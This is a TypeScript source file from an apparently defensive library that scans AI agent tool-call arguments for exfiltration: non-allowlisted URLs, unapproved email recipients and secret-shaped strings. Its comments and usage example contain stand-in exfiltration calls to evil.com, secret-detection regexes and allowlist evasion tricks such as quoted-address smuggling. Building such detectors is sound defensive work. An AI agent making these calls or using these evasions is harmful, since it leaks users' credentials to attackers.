/**
 * Scanner for agent tool-call ARGUMENTS — the third leg of the "lethal
 * trifecta" (private data + untrusted content + outbound channel).
 *
 * `scanOutput` (src/output.ts) only ever sees response text. In an agent,
 * exfiltration usually happens through the arguments of a tool call the
 * model decides to make — `send_email(to="attacker@evil.com", body=<secrets>)`
 * or `fetch("https://evil.com/?k=" + apiKey)` — which never appears in the
 * model's visible output at all. `scanToolCall` walks those arguments
 * looking for the same shape of evidence: URLs leaving an allowlisted set
 * of origins, recipients outside an allowlist, and secret-shaped strings.
 */

// ── Config bounds ────────────────────────────────────────────────────

/**
 * Recursion cap on `args` traversal — bounds a hostile/degenerate shape.
 * Exceeding it produces a `depth-limit-exceeded` finding (fail-closed)
 * instead of silently stopping — a payload could otherwise hide past the
 * cap and scan clean simply by nesting deep enough.
 */
const MAX_ARGS_DEPTH = 32;

/** Redaction: keep this many leading chars of a detected secret. */
const REDACT_PREFIX_LEN = 4;
/** Redaction: keep this many trailing chars of a detected secret. */
const REDACT_SUFFIX_LEN = 2;

// ── Public types ─────────────────────────────────────────────────────

export interface ToolCallScanOptions {
  /**
   * Hosts allowed to appear in outbound URLs. Same semantics as
   * `scanOutput`'s `allowedOrigins`: case-insensitive hostname-suffix
   * match, `"example.com"` also matches `api.example.com`. When
   * omitted, every outbound URL is flagged — mirroring `scanOutput()`'s
   * behavior with no allowlist configured.
   */
  allowedOrigins?: string[];
  /**
   * Allowed recipient addresses: an exact email (case-insensitive) or a
   * `"@domain.com"` domain-suffix entry. When omitted, no
   * `unapproved-recipient` findings are produced at all — without an
   * allowlist there is no way to know who is allowed.
   */
  allowedRecipients?: string[];
  /** Additional secret patterns appended to the built-in set. */
  secretPatterns?: RegExp[];
}

export type ToolCallFindingType =
  | "unapproved-origin"
  | "unapproved-recipient"
  | "secret-in-argument"
  | "depth-limit-exceeded";

export interface ToolCallFinding {
  type: ToolCallFindingType;
  /** JSON-ish path to the offending leaf, e.g. `args.to[0]`, `args.body`. */
  path: string;
  /** The URL/email as-is, or a redacted secret (`AKIA…XY`). */
  evidence: string;
}

export interface ToolCallScanResult {
  findings: ToolCallFinding[];
  shouldBlock: boolean;
}

// ── Built-in secret patterns ─────────────────────────────────────────
// Each is linear-time (no nested quantifiers over overlapping classes)
// and non-global, so a fresh global clone is made per scan (see
// `matchAll`) instead of relying on caller-shared `lastIndex` state.

const AWS_ACCESS_KEY_PATTERN = /AKIA[0-9A-Z]{16}/;
const OPENAI_KEY_PATTERN = /sk-[A-Za-z0-9_-]{20,}/;
const GITHUB_TOKEN_PATTERN = /gh[pousr]_[A-Za-z0-9]{36,}/;
const JWT_PATTERN = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/;
const PEM_PRIVATE_KEY_PATTERN = /-----BEGIN [A-Z ]*PRIVATE KEY-----/;
const BEARER_TOKEN_PATTERN = /Bearer\s+[A-Za-z0-9_\-.+=/]{20,}/;
const SLACK_TOKEN_PATTERN = /xox[baprs]-[A-Za-z0-9-]+/;
// ponytail: prose heuristic, not a secrets classifier — matches
// `password=changeme` but also `token: forgotten`. Upgrade path: entropy
// scoring on the captured value if false positives become a problem.
const GENERIC_SECRET_ASSIGNMENT_PATTERN =
  /(api[_-]?key|secret|password|passwd|token)\s*[:=]\s*['"]?\S{8,}/i;

const BUILTIN_SECRET_PATTERNS: RegExp[] = [
  AWS_ACCESS_KEY_PATTERN,
  OPENAI_KEY_PATTERN,
  GITHUB_TOKEN_PATTERN,
  JWT_PATTERN,
  PEM_PRIVATE_KEY_PATTERN,
  BEARER_TOKEN_PATTERN,
  SLACK_TOKEN_PATTERN,
  GENERIC_SECRET_ASSIGNMENT_PATTERN,
];

// URL/email detection — copied from src/output.ts (not exported there)
// rather than editing that file, per this change's file-ownership scope.
//
// Case-insensitive, and covers the obfuscation forms a naive `https?://`
// check misses: protocol-relative (`//evil.com/...`) and the backslash
// separator some parsers accept in place of `//` (`https:\evil.com`).
// The protocol-relative branch requires a host-like character
// immediately after `//` so ordinary text like `a // comment` never
// matches.
const URL_PATTERN =
  /(?:https?:(?:\/\/|\\+)|\/\/(?=[A-Za-z0-9]))[^\s)"'<>]+/gi;
// Length-gated the same way as output.ts's PII email pattern, to avoid
// backtracking blowup on long adversarial input. The local part also
// accepts an RFC-5321 quoted string: `"ceo@mycorp.com"@evil.com` is a
// real, deliverable address whose recipient domain is the one after the
// LAST `@` — matching only the bare-word local-part form let that
// quoted string smuggle a look-alike domain past the allowlist check by
// truncating the match before the real `@evil.com`. The domain side
// also accepts an IP-literal (`[203.0.113.5]`) or non-ASCII (IDN /
// homoglyph) host, purely so `isRecipientAllowed` gets a chance to see
// and reject them — both are treated as never-allowed there.
const EMAIL_PATTERN =
  /(?:"[^"]{0,253}"|[a-zA-Z0-9._%+-]{1,64})@(?:\[[0-9a-fA-F:.]{2,45}\]|[\p{L}\p{N}.-]{1,253}\.[\p{L}]{2,24})/gu;

// ── Matching helpers ─────────────────────────────────────────────────

/**
 * Run `pattern` against `text` with a fresh global clone every call, so
 * shared `lastIndex` state (this repo's `lastIndex`/`extraPatterns` bug,
 * see `ensureGlobalFlag` in src/patterns.ts) can't cause false negatives
 * regardless of whether the caller passed a `/g` regex.
 */
function matchAll(pattern: RegExp, text: string): string[] {
  const flags = pattern.global ? pattern.flags : `${pattern.flags}g`;
  const re = new RegExp(pattern.source, flags);
  const matches: string[] = [];
  let match: RegExpExecArray | null;
  while ((match = re.exec(text)) !== null) {
    matches.push(match[0]);
    if (match[0].length === 0) re.lastIndex++;
  }
  return matches;
}

/** Mirrors output.ts's `hostMatchesAllowlist` (not exported there). */
function isOriginAllowed(url: string, allowedOrigins: string[]): boolean {
  let host: string;
  try {
    host = new URL(url).hostname.toLowerCase();
  } catch {
    return false; // unparseable URL — conservative default: flag it
  }
  for (const entry of allowedOrigins) {
    const lowerEntryRaw = entry.toLowerCase();
    const isSubdomainOnly = lowerEntryRaw.startsWith(".");
    const lowerEntry = isSubdomainOnly ? lowerEntryRaw.slice(1) : lowerEntryRaw;
    if (!isSubdomainOnly && host === lowerEntry) return true;
    if (host.endsWith(`.${lowerEntry}`)) return true;
  }
  return false;
}

/**
 * A domain shape that can never satisfy an allowlist entry, regardless of
 * what it contains: an IP-literal host (`[203.0.113.5]`) has no
 * meaningful suffix to match, and a non-ASCII (IDN/homoglyph) host risks
 * a visually-confusable domain sailing past a suffix check written in
 * plain ASCII. Reject both outright rather than let them reach the loop
 * below.
 */
function isDisallowedDomainShape(domain: string): boolean {
  if (domain.startsWith("[") && domain.endsWith("]")) return true;
  for (let i = 0; i < domain.length; i++) {
    if (domain.charCodeAt(i) > 127) return true; // non-ASCII (IDN/homoglyph)
  }
  return false;
}

function isRecipientAllowed(email: string, allowedRecipients: string[]): boolean {
  const lowerEmail = email.toLowerCase();
  // The domain is everything after the LAST `@`. An RFC-5321 quoted
  // local part can embed its own `@` (`"ceo@mycorp.com"@evil.com`) —
  // taking the first `@` reads that inner text as the domain and misses
  // the address's real, deliverable domain entirely.
  const domain = lowerEmail.slice(lowerEmail.lastIndexOf("@") + 1);
  if (isDisallowedDomainShape(domain)) return false;
  for (const entry of allowedRecipients) {
    const lowerEntry = entry.toLowerCase();
    if (lowerEntry.startsWith("@")) {
      if (domain === lowerEntry.slice(1)) return true;
    } else if (lowerEmail === lowerEntry) {
      return true;
    }
  }
  return false;
}

function redactSecret(matched: string): string {
  if (matched.length <= REDACT_PREFIX_LEN + REDACT_SUFFIX_LEN) return "…";
  return `${matched.slice(0, REDACT_PREFIX_LEN)}…${matched.slice(-REDACT_SUFFIX_LEN)}`;
}

/**
 * Evidence for an `unapproved-origin` finding must not leak what made the
 * URL worth flagging in the first place: userinfo credentials or a
 * secret riding in the query string / fragment. Report `origin +
 * pathname` only, with a literal `?…` / `#…` marker when a query or
 * fragment was present. `URL#origin` already drops userinfo. An
 * unparseable URL falls back to the generic secret redaction rather than
 * echoing the raw (potentially secret-bearing) text.
 */
function redactUrl(url: string): string {
  try {
    const parsed = new URL(url);
    const querySuffix = parsed.search ? "?…" : "";
    const hashSuffix = parsed.hash ? "#…" : "";
    return `${parsed.origin}${parsed.pathname}${querySuffix}${hashSuffix}`;
  } catch {
    return redactSecret(url);
  }
}

// ── Argument walk ────────────────────────────────────────────────────

interface ScanContext {
  allowedOrigins: string[];
  allowedRecipients: string[] | undefined;
  secretPatterns: RegExp[];
}

function scanStringLeaf(
  text: string,
  path: string,
  ctx: ScanContext,
  findings: ToolCallFinding[]
): void {
  for (const url of matchAll(URL_PATTERN, text)) {
    if (!isOriginAllowed(url, ctx.allowedOrigins)) {
      findings.push({ type: "unapproved-origin", path, evidence: redactUrl(url) });
    }
  }

  if (ctx.allowedRecipients) {
    for (const email of matchAll(EMAIL_PATTERN, text)) {
      if (!isRecipientAllowed(email, ctx.allowedRecipients)) {
        findings.push({ type: "unapproved-recipient", path, evidence: email });
      }
    }
  }

  // Applies to every string leaf, including URLs — a secret in an
  // otherwise-allowed URL's query string must still be caught.
  for (const pattern of ctx.secretPatterns) {
    for (const match of matchAll(pattern, text)) {
      findings.push({
        type: "secret-in-argument",
        path,
        evidence: redactSecret(match),
      });
    }
  }
}

/** Marks a finding's `path` as pointing at an object key, not its value. */
const KEY_FINDING_SUFFIX = " (key)";

/**
 * Walk `[key, value]` pairs from a plain object's entries or a `Map`.
 * Keys are scanned as leaves too — `{ "https://evil.com/?k=abc": "1" }`
 * and an AWS key used as a header name are both exfiltration-shaped even
 * though nothing ever reads them as a *value*.
 */
function scanEntries(
  entries: Iterable<[unknown, unknown]>,
  path: string,
  depth: number,
  seen: WeakSet<object>,
  ctx: ScanContext,
  findings: ToolCallFinding[]
): void {
  for (const [key, child] of entries) {
    const keySegment = typeof key === "string" ? key : String(key);
    if (typeof key === "string") {
      scanStringLeaf(key, `${path}.${keySegment}${KEY_FINDING_SUFFIX}`, ctx, findings);
    }
    walk(child, `${path}.${keySegment}`, depth + 1, seen, ctx, findings);
  }
}

function walk(
  value: unknown,
  path: string,
  depth: number,
  seen: WeakSet<object>,
  ctx: ScanContext,
  findings: ToolCallFinding[]
): void {
  if (depth > MAX_ARGS_DEPTH) {
    // Fail closed: an argument shape this deep can't be proven safe.
    // Truncating silently (the prior behavior) let a payload nested past
    // the cap escape scanning entirely — surface the truncation itself
    // as a blocking finding instead.
    findings.push({
      type: "depth-limit-exceeded",
      path,
      evidence: `nesting exceeds max depth ${MAX_ARGS_DEPTH}`,
    });
    return;
  }

  if (typeof value === "string") {
    scanStringLeaf(value, path, ctx, findings);
    return;
  }
  // Numbers, booleans, null, undefined, functions, symbols — no findings.
  if (value === null || typeof value !== "object") return;
  if (seen.has(value)) return; // cycle guard
  seen.add(value);

  if (Array.isArray(value)) {
    value.forEach((item, i) => walk(item, `${path}[${i}]`, depth + 1, seen, ctx, findings));
    return;
  }
  if (value instanceof Map) {
    scanEntries(value.entries(), path, depth, seen, ctx, findings);
    return;
  }
  if (value instanceof Set) {
    let i = 0;
    for (const item of value) {
      walk(item, `${path}[${i}]`, depth + 1, seen, ctx, findings);
      i++;
    }
    return;
  }
  scanEntries(Object.entries(value as Record<string, unknown>), path, depth, seen, ctx, findings);
}

// ── Public API ───────────────────────────────────────────────────────

/**
 * Scan an agent tool-call's arguments for exfiltration shape: URLs
 * leaving an allowlisted set of origins, recipients outside an
 * allowlist, and secret-shaped strings (API keys, tokens, JWTs, PEM
 * headers, generic `key: value` assignments).
 *
 * Reports only — the caller decides whether to block, warn, or log.
 * `name` is accepted for a stable call signature and future per-tool
 * policy; no per-tool behavior exists yet.
 *
 * @example
 * ```ts
 * import { scanToolCall } from "llm-prompt-guard";
 *
 * const result = scanToolCall("send_email", {
 *   to: "attacker@evil.com",
 *   body: "here's the API key: sk-abc123...",
 * }, { allowedRecipients: ["@mycorp.com"] });
 *
 * if (result.shouldBlock) {
 *   console.warn("Blocked tool call:", result.findings);
 * }
 * ```
 */
export function scanToolCall(
  _name: string,
  args: unknown,
  options: ToolCallScanOptions = {}
): ToolCallScanResult {
  const findings: ToolCallFinding[] = [];
  const ctx: ScanContext = {
    allowedOrigins: options.allowedOrigins ?? [],
    allowedRecipients: options.allowedRecipients,
    secretPatterns: options.secretPatterns
      ? [...BUILTIN_SECRET_PATTERNS, ...options.secretPatterns]
      : BUILTIN_SECRET_PATTERNS,
  };
  walk(args, "args", 0, new WeakSet(), ctx, findings);
  return { findings, shouldBlock: findings.length > 0 };
}
